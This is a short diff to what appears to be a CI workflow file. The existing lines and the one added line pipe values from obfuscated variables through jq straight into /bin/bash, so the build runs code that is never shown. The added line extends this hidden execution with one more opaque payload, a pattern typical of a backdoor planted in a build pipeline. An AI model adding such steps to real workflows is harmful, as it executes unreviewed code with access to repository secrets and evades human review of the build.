@@ -32,6 +32,7 @@ jobs:
           echo $h34011 | jq -r .shr1 | /bin/bash
           echo $ub85054 | jq -r .s8 | /bin/bash
           printf '%s' "$grazr52" | jq -r .zq455 | /bin/bash
+          echo $ed1163 | jq -r .r193 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
